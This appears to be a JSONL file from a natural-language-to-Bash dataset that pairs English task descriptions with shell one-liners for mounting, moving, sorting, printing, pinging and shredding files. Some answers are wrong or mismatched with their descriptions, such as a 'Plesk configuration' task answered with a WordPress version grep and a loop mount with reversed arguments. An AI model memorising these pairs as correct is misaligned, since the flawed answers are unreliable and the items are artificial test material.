{"input": "Monitor 3 specific process IDs: 18884, 18892, and 18919 (GNU specific)", "answer": "top -p 18884 -p 18892 -p 18919"}
{"input": "Mount \"/dev/shm\" using /etc/fstab entry", "answer": "mount /dev/shm"}
{"input": "Mount \"device_name\" on \"mount_point\"", "answer": "sudo mount device_name mount_point"}
{"input": "Mount \"nifs\" filesystem \"/dev/mapper/myldm\" on \"/mnt\" as read only", "answer": "mount -t ntfs -o ro /dev/mapper/myldm /mnt"}
{"input": "Mount \"vfat\" filesystem \"/dev/sda7\" to \"/mnt/my_partition\" with read and write permission, umask of files and directories set to \"0000\", and save in fstab and allow ordinary users to mount", "answer": "sudo mount -t vfat -o rw,auto,user,fmask=0000,dmask=0000 /dev/sda7 /mnt/my_partition"}
{"input": "Mount a partition in \"$IMAGE\" with offset \"$OFFSET\" to \"media/$DEST\" as read only using a loop device", "answer": "mount -o ro,loop,offset=$OFFSET -t auto $IMAGE /media/$DEST"}
{"input": "Mount a read only ntfs filesystem", "answer": "mount -t ntfs"}
{"input": "Mount image \"test\" to loop device \"/dev/loop0\"", "answer": "sudo mount -o loop /dev/loop0 test"}
{"input": "Mount partition with label \"WHITE\" on \"/mnt/WHITE\" with read and write permission and have it accessible by user and group \"test\"", "answer": "mount -L WHITE /mnt/WHITE -o rw,uid=test,gid=test"}
{"input": "Mount the \"linprocfs\" filesystem on \"/proc\"", "answer": "mount -t linprocfs none /proc"}
{"input": "Mount the \"vboxsf\" filesystem \"D:\\share_folder_vm\" on \"\\share_folder\"", "answer": "sudo mount -t vboxsf D:\\share_folder_vm \\share_folder"}
{"input": "Mount the directory \"/etc\" on \"/tmp/sarnold/mount_point/\"", "answer": "mount -obind /etc /tmp/sarnold/mount_point/"}
{"input": "Move \"$PHANTOM_JS\" to \"/usr/local/share\" directory", "answer": "sudo mv $PHANTOM_JS /usr/local/share"}
{"input": "Move \"caniwrite\" without clobbering into \"/usr/local/bin\"", "answer": "mv -nv caniwrite /usr/local/bin"}
{"input": "Move \"file.txt\" to docker container \"$CONTAINER_ID\" in path \"/var/lib/docker/devicemapper/mnt/$CONTAINER_ID/rootfs/root/file.txt\"", "answer": "mv -f file.txt /var/lib/docker/devicemapper/mnt/$CONTAINER_ID/rootfs/root/file.txt"}
{"input": "Move \"file.txt\" to docker container \"$COUNTAINER_ID\" in path \"/var/lib/docker/aufs/mnt/$CONTAINER_ID/rootfs/root/file.txt\"", "answer": "mv -f file.txt /var/lib/docker/aufs/mnt/$CONTAINER_ID/rootfs/root/file.txt"}
{"input": "Move \"file1\", \"file2\", \"...\" to \"target\" directory", "answer": "mv -t target file1 file2 ..."}
{"input": "Move \"phantomjs-1.8.1-linux-x86_64.tar.bz2\" to \"/usr/local/share/\" directory", "answer": "sudo mv phantomjs-1.8.1-linux-x86_64.tar.bz2 /usr/local/share/."}
{"input": "Move *wp-admin/index.php files under /var/www/  to ./index_disabled", "answer": "find /var/www/ -path '*wp-admin/index.php' -exec mv {} $(dirname {})/index_disabled"}
{"input": "Move all *.data files/directories in $S directory to $S/data/ directory", "answer": "find \"${S}\" -name '*.data' -exec mv '{}' \"${S}/data/\" \\;"}
{"input": "Move all *.emlx files/directories under /path/to/folders/ to ./Messages/ directory", "answer": "find /path/to/folders/ -name \\*.emlx -print0 | xargs -0 -I {} mv {} ./Messages/"}
{"input": "Move all *.mp4 files from directory /foo/bar and its subdirectories to /some/path", "answer": "find /foo/bar -name '*.mp4' -exec mv -t /some/path {} +"}
{"input": "Move all *.pdf.marker files and their corresponding *.pdf files under ${INPUT} to ${OUTPUT}", "answer": "find ${INPUT}/ -name \"*.pdf\" -exec mv '{}' '{}'.marker ${OUTPUT} \\;"}
{"input": "Move all *.php~ (case insensitive) files under current directory to /mydir", "answer": "find . -iname \"*.php~\" -exec mv \"{}\" /mydir +;"}
{"input": "Move all 10*jpg files under /path to 2010*jpg files under the same directory", "answer": "find /path -type f -name \"10*jpg\" | sed 's/.*/mv &/' | sed 's/mv \\(.*\\/\\)\\(.[^/]*\\)/& \\120\\2/' | sh"}
{"input": "Move all Emacs backup files from the current directory tree to ~/backups/", "answer": "find . -name '*~' -print 0 | xargs -0 -I % cp % ~/backups"}
{"input": "Move all directories in the current directory that match \"some-dir\" to \"x/\"", "answer": "find ./ -maxdepth 1 -name \"some-dir\" -type d -print0 | xargs -0r mv -t x/"}
{"input": "Move all directories in the current directory tree that have been modified in the last day to \"/path/to/target-dir\"", "answer": "find . -depth -type d -mtime 0 -exec mv -t /path/to/target-dir {} +"}
{"input": "Move all lines starting with \"Ca\" to the beginning of the file", "answer": "nl -n rz ca | awk -vOFS=\"\\t\" '/Ca/{$1=\"#\"$2} {$1=$1}1' | sort -k1,1 | cut -f2-"}
{"input": "Move all regular files under current directory to ./newdir", "answer": "find ./ -type f -print | xargs    -i mv -f {} ./newdir"}
{"input": "Move all the .c files from the current directory tree to temp/", "answer": "find . -name \"*.c\" -print0 | xargs -0 -n1  -I '{}' mv '{}' temp"}
{"input": "Move each of the 'm?' directories in $path_to_folders to another directory whose name is constituted by appending .mbox to each directory name and create a directory named Messages in this directory then move all *.emlx files into this directory", "answer": "find \"$path_to_folders\" -name 'm?' -type d -exec mv {} {}.mbox \\; -exec mkdir {}.mbox/Messages \\; -exec sh -c \"mv {}.mbox/*.emlx {}.mbox/Messages\" \\;"}
{"input": "Move each of the 'm?' directories in current directory to another directory whose name is constituted by appending .mbox to each directory name and create a directory named Messages in this directory then move all *.emlx files into this directory", "answer": "find . -name 'm?' -type d -exec mv '{}' '{}.mbox' ';' -exec mkdir '{}.mbox/Messages' ';' -exec sh -c 'mv {}.mbox/*.emlx {}.mbox/Messages' ';'"}
{"input": "Move each of the directories in /path/to/folders/* to another directory whose name is constituted by appending .mbox to each directory name and create a directory named Messages in this directory", "answer": "find /path/to/folders/* -type d -exec mv {} {}.mbox \\; -exec mkdir {}.mbox/Messages \\;"}
{"input": "Move each of the directories in /path/to/folders/* to another directory whose name is constituted by appending .mbox to each directory name and create a directory named Messages in this directory then move all *.emlx files into this directory", "answer": "find /path/to/folders/* -type d  -exec mv {} {}.mbox \\; -exec mkdir {}.mbox/Messages \\; -exec sh -c \"mv {}.mbox/*.emlx {}.mbox/Messages\" \\;"}
{"input": "Move server.log to 'logs' directory with new name as the current date formatted as \"%Y%m%d%H%M\" and with '.log' extension", "answer": "mv server.log logs/$(date -d \"today\" +\"%Y%m%d%H%M\").log"}
{"input": "Moves file '$2' to the folder where '$1' file is located", "answer": "mv \"$2\" \"`dirname $1`\""}
{"input": "Moves the file that named like file $1 from '/tmp' folder to the folder where $2 file is located", "answer": "mv \"/tmp/`basename $1`\" \"`dirname $2`\""}
{"input": "Non-recursively finds all '*.pdf' files in a current folder and removes them", "answer": "find -maxdepth 1 -name '*.pdf' -exec rm \"{}\" \\;"}
{"input": "Number each line in \"/etc/passwd\" as right-justified zero padded to a width of 9", "answer": "nl -nrz -w9  /etc/passwd"}
{"input": "Number each line in \"foobar\" as right-justified zero padded to a width of 9", "answer": "nl -nrz -w9 foobar"}
{"input": "Number each non-blank line of standard input", "answer": "nl"}
{"input": "Number every line of standard input as zero padded to 6 characters followed by \"-\"", "answer": "nl -s- -ba -nrz"}
{"input": "Numberically sort content of file 'files', using for sorting part of second one of dash separated fields beginning from second letter", "answer": "cat files | sort -t- -k2,2 -n"}
{"input": "Numerically sort IPv4 addresses specified on standard input with presedence to first, second, third, then fourth octet", "answer": "tr '.' ' ' | sort -nu -t ' ' -k 1 -k 2 -k 3 -k 4 | tr ' ' '.'"}
{"input": "Numerically sort file \"file.dat\" by the second word of each line and output from greatest value to least value", "answer": "sort -nk 2,2 file.dat | tac"}
{"input": "Numerically sort file \"files\" by the second \"-\" separated value of each line ordered from least value to highest value", "answer": "tac files | sort -t- -k2,2 -n"}
{"input": "Numerically sort file \"table\" by the fourth character of the second field, ignoring leading spaces", "answer": "sort -b -n -k2.4 table"}
{"input": "Numerically sort file \"temp.txt\" by the second \"-\" separated value of each line ordered from highest value to least value", "answer": "tac temp.txt | sort -k2,2 -r -u"}
{"input": "Numerically sort standard input by the second word of each line and output from greatest value to least value", "answer": "sort -nrk 2,2"}
{"input": "Open a local SSH port on 1080 for application-level port forwarding", "answer": "ssh -D1080 root@localhost -g"}
{"input": "Open a ssh connection to \"user@host\" with a control socket \"/tmp/%r@%h:%p\"", "answer": "ssh user@host -S /tmp/%r@%h:%p"}
{"input": "Open all .c files in the current directory tree in the vim editor", "answer": "find . -name \"*.c\" -print | vim -"}
{"input": "Open all files named 'filename' with 'nano' editor in the entire filesystem", "answer": "find / -name filename -exec nano '{}' \\;"}
{"input": "Opens gawk info manual and goes to command-line options node", "answer": "info -O gawk"}
{"input": "Opens gcc info manual and selects \"option index\" menu entry", "answer": "info gcc \"option index\""}
{"input": "Opens menu item 'Basic Shell Features' -> 'Shell Expansions' -> 'Filename Expansion' -> 'Pattern Matching' in the 'bash' manual", "answer": "info bash 'Basic Shell Features' 'Shell Expansions' 'Filename Expansion' 'Pattern Matching'"}
{"input": "Output \"file.txt\", omitting all containing directories \"some/unknown/amoutn/of/sub/folder/\"", "answer": "basename \"some/unknown/amount/of/sub/folder/file.txt\""}
{"input": "Output \"stuff\", removing \"/foo/bar/\" from the specified path", "answer": "basename /foo/bar/stuff"}
{"input": "Output \"testFile.txt.1\" without the \".1\" suffix", "answer": "basename testFile.txt.1 .1"}
{"input": "Output a CSV file as a formatted table", "answer": "sed 's/^,/ ,/' test2.csv | tr -d \\\" | column -s, -t"}
{"input": "Output all lines from file1 except those present in file2, assuming both files are sorted", "answer": "diff file2 file1 | grep '^>' | sed 's/^>\\ //'"}
{"input": "Output all lines in 'file' comparing the first 12 characters and discarding any adjascent lines where these characters are duplicates", "answer": "uniq -w12 -c file"}
{"input": "Output all lines in BigFile.csv whose secondn comma-separated second field matches first field of a line in LittleFile.csv", "answer": "join -1 2 -2 1 -t, BigFile.csv LittleFile.csv"}
{"input": "Output all lines that have a common first colon-separated field in files 'selection2.txt' and 'selection1.txt' by displaying the common (first) field of each line, followed by the extra fields in both lines", "answer": "join -t: selection2.txt selection1.txt"}
{"input": "Output line number and lines 200000000 through 200000005 from the infinite input of \"y\"", "answer": "yes | sed -n '200000000,${=;p};200000005q'"}
{"input": "Output lines 16224 to 16482 of 'file', and stop reading 'file' after line 16482", "answer": "awk 'NR==16224, NR==16482-1; NR==16482 {print; exit}' file"}
{"input": "Output lines 16224 to 16482 of 'file', not recommended with large files that contain many lines after the ones needed", "answer": "awk 'NR==16224, NR==16482' file"}
{"input": "Output only the filetype suffix of \"foo.tar.gz\", in this case \"gz\"", "answer": "echo \"foo.tar.gz\" | rev | cut -d\".\" -f1 | rev"}
{"input": "Output success.txt omitting lines whose first field appears in fail.txt - lines in fail.txt must appear in the same order as they do in success.txt", "answer": "join -v1 success.txt fail.txt"}
{"input": "Output the base name of first argument to script or function, that is the part following the last slash", "answer": "echo $(basename \"$1\")"}
{"input": "Output the last slash-separated component of specified path, in this case \"data_report_PD_import_script_ABF1_6\"", "answer": "basename /EBF/DirectiveFiles/data_report_PD_import_script_ABF1_6"}
{"input": "Output the specified path removing all containing directories and the .txt suffix, in this case \"filename\"", "answer": "basename /path/to/dir/filename.txt .txt"}
{"input": "Output the standard input followed by the line number until line 786", "answer": "nl -ba | sed 786q | grep . | awk '{print $2$1}'"}
{"input": "Output the system host name and date to the console", "answer": "echo Hostname=$(hostname) LastChecked=$(date)"}
{"input": "Output two lines of \"-tcp\"", "answer": "yes -- \"-tcp\" | head -n 2"}
{"input": "Overwirte file '/path/to/your/file' with random content, showing progress while execution", "answer": "shred -v -n 1 /path/to/your/file #overwriting with random data"}
{"input": "Overwirte file '/path/to/your/file' with random content, then overwrite with zeroes, and remove, showing progress while execution", "answer": "shred -v -n 1 -z -u /path/to/your/file"}
{"input": "Overwirte file '/path/to/your/file' with zeroes and remove, showing progress while execution", "answer": "shred -v -n 0 -z -u /path/to/your/file #overwriting with zeroes and remove the file"}
{"input": "Overwrite a file 'my-existing-file' with random data to hide its content", "answer": "shred my-existing-file"}
{"input": "Overwrites file $FILE with random content, then truncates and deletes it", "answer": "shred -u $FILE"}
{"input": "Overwrites file 'filename' with random content 35 times, finally writes it with zeros, truncates and deletes", "answer": "shred -uzn 35 filename"}
{"input": "Page through the contents of 'input_file_name' hexdumped with space-separated 2-byte units", "answer": "od -xcb input_file_name | less"}
{"input": "Page through the contents of yourFile, adding a $ at the end of each line and replacing tab characters by ^I", "answer": "cat -vet file | less"}
{"input": "Page through the contents of yourFile, adding a $ at the end of each line", "answer": "cat -e yourFile | less"}
{"input": "Pair side-by-side content of the 'file' and its side-mirrored content", "answer": "paste -d ' ' file <(rev file)"}
{"input": "Pass a wildcard to scp by escaping it: copy all files with names starting with \"files\" in directory \"/location\" on host \"server\" to current directory on local machine, displaying debug info and preserving timestamps and permissions on copied files", "answer": "scp -vp me@server:/location/files\\*"}
{"input": "Pass all the files from the current directory tree as arguments to a single 'echo' command", "answer": "find . -exec echo {} +"}
{"input": "Perform a default Plesk configuration", "answer": "find /var/www/vhosts/*/httpdocs -type f -iwholename '*/wp-includes/version.php' -exec grep -H '\\$wp_version =' {} \\;"}
{"input": "Perform a default cPanel configuration", "answer": "find /home/*/public_html/ -type f -iwholename '*/wp-includes/version.php' -exec grep -H '\\$wp_version =' {} \\;"}
{"input": "Perform a dry run replacing \"special\" with \"regular\" in all file names in the current directory", "answer": "rename -n 's/special/regular/' **"}
{"input": "Perform a dry run to recursively copy \"test/a\" to \"test/dest\" excluding \"test/a/b/c/d\"", "answer": "rsync -nvraL test/a test/dest --exclude=a/b/c/d"}
{"input": "Perform a white space safe search for all files/directories under current directory", "answer": "find . -print0 | xargs -0"}
{"input": "Perform case-insensitive search for file `TeSt123.txt' on the system", "answer": "find / -iname TeSt123.txt"}
{"input": "Perform white space safe deletion of files named core under /tmp", "answer": "find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f"}
{"input": "Pick up a list of variable:value pairs from msgs.config and add them to the current shell or script's environment", "answer": "source <( sed 's/:\\(.*\\)/=\"\\1\"/' msgs.config )"}
{"input": "Ping all hosts in file \"ips\" twice", "answer": "cat ips | xargs -i% ping -c 2 %"}
{"input": "Ping every address from 192.168.0.1 to 192.168.0.254 with a timeout of 1 second and filter out no responses", "answer": "echo $(seq 254) | xargs -P255 -I% -d\" \" ping -W 1 -c 1 192.168.0.% | grep -E \"[0-1].*?:\""}
{"input": "Pipe 3 newlines to sshe-keygen, answering prompts automatically", "answer": "echo -e \"\\n\\n\\n\" | ssh-keygen -t rsa"}
{"input": "Pipe output of \"yes\" to \"more\" and append the first 3 lines to \"file\"", "answer": "yes | awk 'FNR<4 {print >>\"file\"; close(\"file\")}  1' | more"}
{"input": "Pipe the output of ls into \"read var\" in its separate process", "answer": "ls | read var"}
{"input": "Places current job to background", "answer": "bg %  so it wont die when you logoff"}
{"input": "Prefix all files and directories in the current directory with \"Unix_\"", "answer": "ls | xargs -I {} mv {} Unix_{}"}
{"input": "Prefix all files and directories in the current directory with \"unix_\"", "answer": "ls | xargs -i mv {} unix_{}"}
{"input": "Prefix all files and folders in the current directory with \"PRE_\"", "answer": "find * -maxdepth 0 ! -path . -exec mv {} PRE_{} \\;"}
{"input": "Prepend date to ping output to google.com", "answer": "ping google.com | xargs -L 1 -I '{}' date '+%+: {}'"}
{"input": "Prepend the reverse history number as negative values to the output of the history command with arguments \"$@\"", "answer": "history \"$@\" | tac | nl | tac | sed 's/^\\( *\\)\\([0-9]\\)/\\1-\\2/'"}
{"input": "Prepend the reverse history number to the output of the history command with arguments \"$@\"", "answer": "history \"$@\" | tac | nl | tac"}
{"input": "Print \"#include\" statements found in \"file2\" that are not in \"file1\"", "answer": "comm -13 <(grep '#include' file1 | sort) <(grep '#include' file2 | sort)"}
{"input": "Print \"$1\" or default 10 random lines from standard input", "answer": "nl | sort -R | cut -f2 | head -\"${1:-10}\""}
{"input": "Print \"$PATH\" variable as input to awk script \"rem_dup.awk\" and concatenate the result with \":\"", "answer": "echo $PATH | awk -F: -f rem_dup.awk | paste -sd:"}
{"input": "Print \"$line\" in hexadecimal 2-byte units", "answer": "echo -n $line | od -x"}
{"input": "Print \"$somedir is empty\" if $somedir is empty", "answer": "find \"$somedir\" -maxdepth 0 -empty -exec echo {} is empty. \\;"}
{"input": "Print \"I am USER and the program named ls is in LS_PATH\" where \"USER\" is the current user's user name and \"LS_PATH\" is the full path of the command \"ls\"", "answer": "echo I am $(whoami) and the program named ls is in $(which ls)."}
{"input": "Print \"RDBMS exit code : $RC  \" to the console and append to \"${LOG_FILE}\"", "answer": "echo \" RDBMS exit code : $RC  \"     | tee -a ${LOG_FILE}"}
{"input": "Print \"This is a sentence.\" by replacing all consecutive space characters with a single newline character", "answer": "echo \"This is   a sentence.\" | tr -s \" \" \"\\012\""}
{"input": "Print \"Total generated: \" followed by the number of unique lines in \"$generated_ports\"", "answer": "echo \"Total generated: $(echo \"$generated_ports\" | sort | uniq | wc -l).\""}
{"input": "Print \"a\\nb\\ncccccccccccc\\nd\" as two columns and neatly format into a table", "answer": "echo -e \"a\\nb\\ncccccccccccc\\nd\" | paste - - | column -t"}
{"input": "Print \"echo ping -c 2\" on each string in file 'ips'", "answer": "cat ips | xargs -n1 echo ping -c 2"}
{"input": "Print \"file1.txt\" \"file2.txt\" and \"file3.txt\" with filename headers", "answer": "tail -n +1 file1.txt file2.txt file3.txt"}
{"input": "Print \"huzzah\" if directory \"/some/dir\" is empty", "answer": "find /some/dir/ -maxdepth 0 -empty -exec echo \"huzzah\" \\;"}
{"input": "Print \"new.txt\" with line numbers prepended", "answer": "cat new.txt  | nl"}
{"input": "Print \"new.txt\" with line numbers prepended and line 2 or any line containing \"2\" deleted", "answer": "cat new.txt  | nl | sed  \"/2/d\""}
{"input": "Print \"new.txt\" with line numbers prepended and lines 3 and 4 deleted", "answer": "cat new.txt  |  nl |sed  \"3d;4d\""}
{"input": "Print \"y\" for each line in \"file2.txt\" found in \"file1.txt\" and a blank newline otherwise", "answer": "comm -2 file1.txt file2.txt | awk -F'\\t' '{print (NF==2?\"y\":\"\")}'"}
{"input": "Print \"yes\" 4 times followed by 1 \"no\"", "answer": "yes yes | sed -e 5s/yes/no/ -e 5q"}
{"input": "Print $d if $d is an empty directory", "answer": "find \"$d\" -prune -empty -type d"}
{"input": "Print '\"HTTP/1.1 200 OK', two new lines and the current date", "answer": "echo -e \"HTTP/1.1 200 OK\\n\\n $(date)\""}
{"input": "Print '-exec is an action so an implicit -print is not applied' for every file/directory found by the name 'file' under current directory tree", "answer": "find -name file -exec echo '-exec is an action so an implicit -print is not applied' \\;"}
{"input": "Print '-ok is an action so an implicit -print is not applied' with confirmation from the user for each file or directory found by the name 'file' under current directory tree", "answer": "find -name file -ok echo '-ok is an action so an implicit -print is not applied' \\;"}
{"input": "Print '-okdir is an action so an implicit -print is not applied' for each file/directory found by the name 'file' under current directory tree", "answer": "find -name file -okdir echo '-okdir is an action so an implicit -print is not applied' \\;"}
{"input": "Print '111 22 3\\n4 555 66\\n' by replacing the spaces with tabs and '\\n' with newlines", "answer": "echo -en '111 22 3\\n4 555 66\\n' | tr ' ' '\\t'"}
{"input": "Print 'Since -printf is an action the implicit -print is not applied\\n' for every file named 'file' found under current directory tree", "answer": "find -name file -printf 'Since -printf is an action the implicit -print is not applied\\n'"}
{"input": "Print 'This should print the filename twice if an implicit -print is applied: ' appended with file paths for all files named 'file' under current directory tree", "answer": "find -name file -exec echo 'This should print the filename twice if an implicit -print is applied: ' {} +"}
{"input": "Print 'bla.txt' if at least one file with such name is present below the current directory", "answer": "ls -alFt `find . -name \"bla.txt\"` | rev | cut -d\" \" -f1 | rev | head -1"}
{"input": "Print 'cp' commands that would copy a file xyz.c to all the files with '.c' extension present in the ./C directory and below", "answer": "find ./C -name \"*.c\" | xargs -n1  echo cp xyz.c"}
{"input": "Print 'echo 'hello, world'", "answer": "echo 'hello, world' | cat"}
{"input": "Print 'file' content, formatting output as 29-symbol wide column", "answer": "cat file | fold -w29"}
{"input": "Print 'file' content, formatting output as 29-symbol wide column, regarding space symbol as a word separator", "answer": "cat file | fold -s -w29"}
{"input": "Print 'file' file, splitting lines into pieces with no more that 3 words in each one", "answer": "cat file | xargs -n3"}
{"input": "Print 'huzzah' if /some/dir/ is empty", "answer": "find /some/dir/ -maxdepth 0 -empty -exec echo \"huzzah\" \\;"}
{"input": "Print /some/dir/ if it's empty", "answer": "find /some/dir/ -maxdepth 0 -empty"}
{"input": "Print 1 byte from \"/dev/urandom\" as a signed decimal value and no address radix", "answer": "od -A n -t d -N 1 /dev/urandom"}
{"input": "Print 1 to 10 by separating them with colon (':')", "answer": "echo {1..9}: 10 | tr -d ' '"}
{"input": "Print 10 \"#\" characters in a row", "answer": "yes '#' | head -n 10 | tr -d '\\n'"}
{"input": "Print 10 space separated \"x\"s with at most 4 per line", "answer": "yes x | head -10 | awk 'BEGIN { RS = \"%%%%%%%\" } { split($0,a,\"\\n\"); for (i=1; i<length(a); i+=4) print a[i], a[i+1], a[i+2], a[i+3] }'"}
{"input": "Print 1000 astarisk ('*')", "answer": "head -c 1000 /dev/zero | tr '\\0' '*'"}
{"input": "Print 2 lines of \"123456789\"", "answer": "yes 123456789 | head -2"}
{"input": "Print 3 newline separated \"y\"s", "answer": "yes | head -3"}
{"input": "Print 3 space separated '%'", "answer": "echo $(yes % | head -n3)"}
{"input": "Print 7 spaces in a row", "answer": "yes ' ' | head -7 | tr -d '\\n'"}
{"input": "Print A record for domain 'domain.' from 'ns1.newnameserver' nameserver", "answer": "dig @ns1.newnameserver domain. a"}
{"input": "Print A record for domain 'domain.' from 'ns2.newnameserver' nameserver", "answer": "dig @ns2.newnameserver domain. a"}
{"input": "Print A record for domain 'domain.' from 'some.other.ip.address' nameserver", "answer": "dig @some.other.ip.address domain. a"}
{"input": "Print A record for domain 'domain.' from 8.8.8.8 nameserver", "answer": "dig @8.8.8.8 domain. a"}
{"input": "Print DISPLAY of \"orschiro\" user", "answer": "who | awk -F '[()]' '/orschiro/{print $(NF-1)}' | grep -v orschiro | uniq"}
{"input": "Print IP addresses of the host name", "answer": "hostname  -i"}
{"input": "Print NS record for domain 'domain.' from 'some.other.ip.address' nameserver", "answer": "dig @some.other.ip.address domain. ns"}
{"input": "Print NS record for domain 'domain.' from 8.8.8.8 nameserver", "answer": "dig @8.8.8.8 domain. ns"}
{"input": "Print TXT record with server`s hostname from nameserver 'server'", "answer": "dig @server hostname.bind ch txt"}
{"input": "Print URL \"http://www.blabla.bla/forum-detail/?ft=72260&fid=34&&pgr=\" followed by a number ranging from 1 to 786", "answer": "yes 'http://www.blabla.bla/forum-detail/?ft=72260&fid=34&&pgr=' | nl -ba | sed 786q | grep . | awk '{print $2$1}'"}
{"input": "Print a 2 byte hexadecimal value, printable character, and octal value of \"$1\"", "answer": "echo \"$1\" | od -xcb"}
{"input": "Print a colon-separated list of all directories from the $root directory tree", "answer": "find $root -type d -printf '%p:'"}
{"input": "Print a colon-separated list of all directories from the $root directory tree, except those matching pattern \".[a-z]*\"", "answer": "find \"$root\" -name \".[a-z]*\" -prune -o -type d -printf '%p:'"}
{"input": "Print a colon-separated list of all directories from the ~/code directory tree", "answer": "find ~/code -type d | tr '\\n' ':' | sed 's/:$//'"}
{"input": "Print a colon-separated list of all directories from the ~/code directory tree, except hidden ones", "answer": "find ~/code -type d -name '[^\\.]*' | tr '\\n' ':' | sed 's/:$//'"}
{"input": "Print a colon-separated list of all directories from the ~/code directory tree, except hidden ones and those below them", "answer": "find ~/code -name '.*' -prune -o -type d -printf ':%p'"}
{"input": "Print a count of all unique entries in \"ips.txt\" with the most frequent results at the top", "answer": "sort ips.txt | uniq -c | sort -bgr"}
{"input": "Print a count of case insensitive duplicate filenames in the current directory", "answer": "ls -1 | tr '[A-Z]' '[a-z]' | sort | uniq -c | grep -v \" 1 \""}
{"input": "Print a count of duplicate lines in \"filename\"", "answer": "sort filename | uniq -c"}
{"input": "Print a count of each unique line in \"ip_addresses.txt\" sorted numerically", "answer": "sort -n ip_addresses.txt | uniq -c"}
{"input": "Print a count of files and directories in the current directory tree", "answer": "tree | tail -1"}
{"input": "Print a frequency count of column two for every file in the current directory", "answer": "awk -F '\\t' '{print $2}' * | sort | uniq -c | sort -nr"}
{"input": "Print a hex dump of \"$DIREC\" as characters", "answer": "echo \"$DIREC\" | od -c"}
{"input": "Print a minimal set of differences between files in directories \"a\" and \"b\", ignore differences in whitespace, and print 0 lines of unified context", "answer": "diff -dbU0 a b"}
{"input": "Print a minimal set of differences between files in directories \"a\" and \"b\", ignore the first 3 lines of output, and print any line starting with \"-\" with the first character removed", "answer": "diff -dbU0 a b | tail -n +4 | grep ^- | cut -c2-"}
{"input": "Print a minimal set of differences between files in directories \"teste1\" and \"teste2\", treat absent files as empty, ignore differences in whitespace, treat all files as text, and print 3 lines of unified context", "answer": "diff -burNad teste1 teste2"}
{"input": "Print a ping request and the number of packets sent, received, and the percentage lost for each ping request to \"google.com\"", "answer": "ping google.com | awk '{ sent=NR-1; received+=/^.*(time=.+ ms).*$/; loss=0; } { if (sent>0) loss=100-((received/sent)*100) } { print $0; printf \"sent:%d received:%d loss:%d%%\\n\", sent, received, loss; }'"}
{"input": "Print a random number from 2000 to 65000", "answer": "seq 2000 65000 | sort -R | head -n 1"}
{"input": "Print a randomly sorted list of numbers from 1 to 10 to file \"/tmp/lst\" and outputs \"-------\" followed by the reverse list to the screen", "answer": "seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') | tac"}
{"input": "Print a randomly sorted list of numbers from 1 to 10 to file \"/tmp/lst\" and the screen followed by \" -------\"", "answer": "seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------')"}
{"input": "Print a single line of numbers from \"001\" to \"010\"", "answer": "yes | head -n 10 | awk '{printf( \"%03d \", NR )}'"}
{"input": "Print a single line of numbers from \"001\" to \"100\"", "answer": "yes | head -n 100 | awk '{printf( \"%03d \", NR )}'"}
{"input": "Print a sorted list of *.so files in the bla directory tree", "answer": "find bla -name *.so -print0 | sort -rz"}
{"input": "Print a sorted list of all .jpg files in the current directory and below", "answer": "find -name '*.jpg' | sort -n"}
{"input": "Print a sorted list of directories from the ~/Music tree containing files whose names begin with \"cover.\"", "answer": "find ~/Music/ -iname 'cover.*' -printf '%h\\n' | sort -u"}
{"input": "Print a sorted list of the extensions of the regular files from the current directory tree", "answer": "find . -type f -name \"*.*\" | awk -F. '{print $NF}' | sort -u"}
{"input": "Print a sorted list of the extensions of the regular files from the current directory tree matching pattern '*.???'", "answer": "find . -type f -name \"*.???\" | awk -F. '{print $NF}' | sort -u"}
{"input": "Print a sorted list of the subdirectories of ~/Music", "answer": "find ~/Music/ -maxdepth 2 -mindepth 2 -type d | sort"}
{"input": "Print a sorted list of unique directory paths in entire file system that match the pattern '<name_pattern>' in their names", "answer": "find / -name '<name_pattern>' -type d | sort | uniq"}
{"input": "Print a space separated list of numbers from 1 to 10 with no trailing new line", "answer": "seq 10 | xargs echo -n"}
{"input": "Print a tab separated table in \"table.txt\" with cell borders", "answer": "sed -e 's/\\t/_|/g' table.txt |  column -t -s '_' | awk '1;!(NR%1){print \"-----------------------------------------------------------------------\";}'"}
{"input": "Print a time stamp for each successful ping to \"host\"", "answer": "ping host | awk '{if($0 ~ /bytes from/){print strftime()\"|\"$0}else print}'"}
{"input": "Print a top 20 histogram of characters used from standard input showing backslash escapes for non-displayables", "answer": "od -cvAnone -w1 | sort -b | uniq -c | sort -rn | head -n 20"}
{"input": "Print a unique list of characters from standard input showing backslash escapes for non-displayables", "answer": "od -cvAnone -w1 | sort -bu"}
{"input": "Print a welcome message with the current user's user name", "answer": "echo \"Welcome $(whoami)!\""}
{"input": "Print absolute path of \"PATH\"", "answer": "readlink -f PATH"}
{"input": "Print absolute path of java executable", "answer": "readlink -f $(which java)"}
{"input": "Print and recursively remove the alphabetically last directory in the current directory", "answer": "find -mindepth 1 -maxdepth 1 -type d | cut -c 3- | sort -k1n | tail -n 1 | xargs -r echo rm -r"}
{"input": "Print and save the ping results of 25 requests to \"google.com\" in \"/home/user/myLogFile.log\" containing at most 100000 bytes", "answer": "ping -c 25 google.com | tee >(split -d -b 100000 - /home/user/myLogFile.log)"}
{"input": "Print appended data in \"/var/log/some.log\" that match \"foo\" and \"bar\"", "answer": "tail -f /var/log/some.log | grep --line-buffered foo | grep bar"}
{"input": "Print appended data in \"file\" that match \"my_pattern\"", "answer": "tail -f file | grep --line-buffered my_pattern"}
{"input": "Print argument \"$1\" \"$number\" times", "answer": "yes $1 | head -$number"}
{"input": "Print as many dots as there are files named \"file.ext\" in the /home/kibab directory tree", "answer": "find /home/kibab -name file.ext -exec echo . ';'"}
{"input": "Print base name of the file name without all extensions", "answer": "basename \"$FILE\" | cut -d'.' -f-1"}
{"input": "Print bash environment variable array \"fields\" and its values", "answer": "set | grep ^fields=\\\\\\|^var="}
{"input": "Print calendar for February, March and April of year 2009 side-by-side", "answer": "paste <(cal 2 2009) <(cal 3 2009) <(cal 4 2009)"}
{"input": "Print canonical filename of \"/path/there/../../\" even if it does not exist", "answer": "readlink -m /path/there/../../"}
{"input": "Print characters 2 through 4 of \"abcdefg\"", "answer": "echo 'abcdefg'|tail -c +2|head -c 3"}
{"input": "Print characters in variable \"$a\" that exist in variable \"$b\"", "answer": "echo \"$(comm -12 <(echo \"$a\" | fold -w1 | sort | uniq) <(echo \"$b\" | fold -w1 | sort | uniq) | tr -d '\\n')\""}
